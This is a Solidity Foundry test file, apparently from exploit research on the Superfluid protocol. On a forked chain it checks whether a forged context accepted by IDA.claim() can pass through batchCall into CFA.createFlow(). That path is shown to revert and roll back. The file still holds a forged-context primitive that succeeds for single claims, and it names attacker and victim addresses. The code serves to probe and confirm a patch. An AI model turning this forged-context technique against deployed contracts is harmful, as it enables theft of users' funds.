// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {ContextUtils} from "reference/ContextUtils.sol";

interface ISuperAgreement {}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
}

interface ISETH is ISuperToken {
    function upgradeByETH() external payable;
}

struct Operation {
    uint32 operationType;
    address target;
    bytes data;
}

interface ISuperfluidHost {
    function callAgreement(
        ISuperAgreement agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory returnedData);

    function batchCall(Operation[] calldata operations) external;
}

interface IInstantDistributionAgreementV1 is ISuperAgreement {
    function createIndex(
        ISuperToken token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateSubscription(
        ISuperToken token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function updateIndex(
        ISuperToken token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function claim(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);

    function getSubscription(
        ISuperToken token,
        address publisher,
        uint32 indexId,
        address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IConstantFlowAgreementV1 is ISuperAgreement {
    function createFlow(
        ISuperToken token,
        address receiver,
        int96 flowRate,
        bytes calldata ctx
    ) external returns (bytes memory newCtx);
}

/// @title Attempt8
/// @notice Hypothesis: `HOST.batchCall(...)` might let a forged ctx accepted by
///         `IDA.claim()` leak into a later operation in the same batch, making a
///         patched non-claim path such as `CFA.createFlow()` consume the claim's
///         returned ctx instead of rebuilding a fresh top-level ctx.
///
///         This probe shows the opposite:
///         1. batched op-201 `claim()` still succeeds with the trailing-bytes
///            forged ctx primitive, proving batch op-201 reaches the same
///            top-level helper as `callAgreement`;
///         2. `claim() + CFA.createFlow()` in one batch still reverts
///            `invalid ctx`, and the successful claim is rolled back with it.
contract Attempt8 is Test {
    uint32 internal constant OP_CALL_AGREEMENT = 201;

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address constant KNOWN_USDCX_VICTIM = 0x2e9e3C24049655f2D8C59f08602Da3DE4aD34188;
    uint256 constant FORK_BLOCK = 27_039_967;

    uint32 constant SINGLE_BATCH_INDEX_ID = 55_800_001;
    uint32 constant REVERTING_BATCH_INDEX_ID = 55_800_002;
    int96 constant FLOW_RATE = 1;

    ISuperfluidHost constant HOST = ISuperfluidHost(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    IInstantDistributionAgreementV1 constant IDA =
        IInstantDistributionAgreementV1(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
    IConstantFlowAgreementV1 constant CFA =
        IConstantFlowAgreementV1(0x6EeE6060f715257b970700bc2656De21dEdF074C);
    ISETH constant MATICX = ISETH(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);

    address internal flowReceiver;

    function setUp() public {
        vm.createSelectFork("ch5", FORK_BLOCK);
        flowReceiver = makeAddr("flowReceiver");

        vm.label(ATTACKER, "Attacker");
        vm.label(KNOWN_USDCX_VICTIM, "KnownUSDCxVictim");
        vm.label(address(HOST), "SuperfluidHost");
        vm.label(address(IDA), "IDA");
        vm.label(address(CFA), "CFA");
        vm.label(address(MATICX), "MATICx");
        vm.label(flowReceiver, "FlowReceiver");
    }

    function test_batchCall_does_not_thread_claim_ctx_into_cfa() public {
        vm.deal(ATTACKER, 1 ether);

        uint256 nativeBefore = ATTACKER.balance;
        console.log("[start] attacker native:", nativeBefore);
        console.log("[preflight] chain id:", block.chainid);
        console.log("[preflight] fork block:", block.number);

        _seedPendingClaim(SINGLE_BATCH_INDEX_ID);

        bytes memory claimCtx = _buildContext(KNOWN_USDCX_VICTIM, IDA.claim.selector);
        uint256 attackerBeforeSingle = MATICX.balanceOf(ATTACKER);
        (,,, uint256 singlePendingBefore) = IDA.getSubscription(MATICX, ATTACKER, SINGLE_BATCH_INDEX_ID, ATTACKER);

        Operation[] memory singleOps = new Operation[](1);
        singleOps[0] =
            _opCallAgreement(address(IDA), _wrapWithTrailingPlaceholder(_claimInnerCall(SINGLE_BATCH_INDEX_ID, claimCtx)));

        vm.prank(ATTACKER);
        (bool singleOk, bytes memory singleRet) = _batchCall(singleOps);

        uint256 attackerAfterSingle = MATICX.balanceOf(ATTACKER);
        (,,, uint256 singlePendingAfter) = IDA.getSubscription(MATICX, ATTACKER, SINGLE_BATCH_INDEX_ID, ATTACKER);

        console.log("[single batch] ok:", singleOk);
        console.log("[single batch] return bytes:", singleRet.length);
        console.log("[single batch] attacker delta:", attackerAfterSingle - attackerBeforeSingle);
        console.log("[single batch] pending before:", singlePendingBefore);
        console.log("[single batch] pending after:", singlePendingAfter);

        assertTrue(singleOk, "single-op batch claim should succeed");
        assertEq(singleRet.length, 0, "batchCall should not expose claim return bytes");
        assertEq(attackerAfterSingle - attackerBeforeSingle, 1, "single-op batch claim should credit one wei");
        assertEq(singlePendingBefore, 1, "single-op batch should start with one pending wei");
        assertEq(singlePendingAfter, 0, "single-op batch should consume the pending claim");

        _seedPendingClaim(REVERTING_BATCH_INDEX_ID);

        bytes memory cfaCtx = _buildContext(KNOWN_USDCX_VICTIM, CFA.createFlow.selector);
        bytes memory wrappedCfa = _wrapWithTrailingPlaceholder(_cfaCreateFlowInnerCall(cfaCtx));

        vm.prank(ATTACKER);
        (bool directCfaOk, bytes memory directCfaRet) = _callAgreementWithTrailingBytes(CFA, _cfaCreateFlowInnerCall(cfaCtx));
        console.log("[direct forged CFA] ok:", directCfaOk);
        console.log("[direct forged CFA] decoded:", _decodeRevert(directCfaRet));
        assertFalse(directCfaOk, "direct forged CFA path should stay patched");
        assertEq(_decodeRevert(directCfaRet), "invalid ctx", "direct forged CFA should fail on invalid ctx");

        uint256 attackerBeforeFailedBatch = MATICX.balanceOf(ATTACKER);
        (,,, uint256 batchPendingBefore) = IDA.getSubscription(MATICX, ATTACKER, REVERTING_BATCH_INDEX_ID, ATTACKER);

        Operation[] memory failingOps = new Operation[](2);
        failingOps[0] =
            _opCallAgreement(address(IDA), _wrapWithTrailingPlaceholder(_claimInnerCall(REVERTING_BATCH_INDEX_ID, claimCtx)));
        failingOps[1] = _opCallAgreement(address(CFA), wrappedCfa);

        vm.prank(ATTACKER);
        (bool batchOk, bytes memory batchRet) = _batchCall(failingOps);

        uint256 attackerAfterFailedBatch = MATICX.balanceOf(ATTACKER);
        (,,, uint256 batchPendingAfter) = IDA.getSubscription(MATICX, ATTACKER, REVERTING_BATCH_INDEX_ID, ATTACKER);

        console.log("[claim+cfa batch] ok:", batchOk);
        console.log("[claim+cfa batch] decoded:", _decodeRevert(batchRet));
        console.log("[claim+cfa batch] pending before:", batchPendingBefore);
        console.log("[claim+cfa batch] pending after:", batchPendingAfter);
        console.log("[claim+cfa batch] attacker delta:", attackerAfterFailedBatch - attackerBeforeFailedBatch);

        assertFalse(batchOk, "claim+cfa batch should revert");
        assertEq(_decodeRevert(batchRet), "invalid ctx", "second op should still validate a fresh ctx");
        assertEq(batchPendingBefore, 1, "reverting batch should start with one pending wei");
        assertEq(batchPendingAfter, 1, "reverting batch should roll back the successful claim");
        assertEq(attackerAfterFailedBatch, attackerBeforeFailedBatch, "reverting batch must roll back token movement");

        uint256 nativeAfter = ATTACKER.balance;
        console.log("[end] attacker native:", nativeAfter);
        console.logInt(int256(nativeAfter) - int256(nativeBefore));
    }

    function _seedPendingClaim(uint32 indexId) internal {
        vm.prank(ATTACKER);
        MATICX.upgradeByETH{value: 2 wei}();

        vm.startPrank(ATTACKER);
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.createIndex, (MATICX, indexId, new bytes(0))), "createIndex");
        _callAgreementOrRevert(
            IDA,
            abi.encodeCall(IDA.updateSubscription, (MATICX, indexId, ATTACKER, uint128(1), new bytes(0))),
            "updateSubscription"
        );
        _callAgreementOrRevert(IDA, abi.encodeCall(IDA.updateIndex, (MATICX, indexId, uint128(1), new bytes(0))), "updateIndex");
        vm.stopPrank();
    }

    function _batchCall(Operation[] memory ops) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.batchCall, (ops)));
    }

    function _callAgreementOrRevert(
        ISuperAgreement agreement,
        bytes memory inner,
        string memory step
    ) internal {
        (bool ok, bytes memory ret) = _callAgreementRaw(agreement, inner);
        require(ok, string.concat(step, ": ", _decodeRevert(ret)));
    }

    function _callAgreementRaw(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return address(HOST).call(abi.encodeCall(HOST.callAgreement, (agreement, inner, new bytes(0))));
    }

    function _callAgreementWithTrailingBytes(
        ISuperAgreement agreement,
        bytes memory inner
    ) internal returns (bool ok, bytes memory ret) {
        return _callAgreementRaw(agreement, _wrapWithTrailingPlaceholder(inner));
    }

    function _opCallAgreement(address agreement, bytes memory wrappedCallData) internal pure returns (Operation memory op) {
        op.operationType = OP_CALL_AGREEMENT;
        op.target = agreement;
        op.data = abi.encode(wrappedCallData, new bytes(0));
    }

    function _claimInnerCall(uint32 indexId, bytes memory fakeCtx) internal view returns (bytes memory) {
        return abi.encodeCall(IDA.claim, (MATICX, ATTACKER, indexId, ATTACKER, fakeCtx));
    }

    function _cfaCreateFlowInnerCall(bytes memory fakeCtx) internal view returns (bytes memory) {
        return abi.encodeCall(CFA.createFlow, (MATICX, flowReceiver, FLOW_RATE, fakeCtx));
    }

    function _wrapWithTrailingPlaceholder(bytes memory inner) internal pure returns (bytes memory) {
        return abi.encodePacked(inner, abi.encode(new bytes(0)));
    }

    function _buildContext(address msgSender, bytes4 selector) internal view returns (bytes memory) {
        ContextUtils.Context memory ctx = ContextUtils.buildContext(msgSender, selector, "");
        ctx.appCreditGranted = type(uint128).max;
        ctx.appAddress = ATTACKER;
        ctx.appCreditToken = address(MATICX);
        return ContextUtils.encodeContext(ctx);
    }

    function _decodeRevert(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 4) {
            if (revertData.length == 0) {
                return "silent revert";
            }
            return string(revertData);
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector == 0x08c379a0 && revertData.length >= 68) {
            assembly {
                revertData := add(revertData, 4)
            }
            return abi.decode(revertData, (string));
        }

        if (selector == 0x4e487b71) {
            return "panic";
        }

        return "custom/unknown";
    }
}
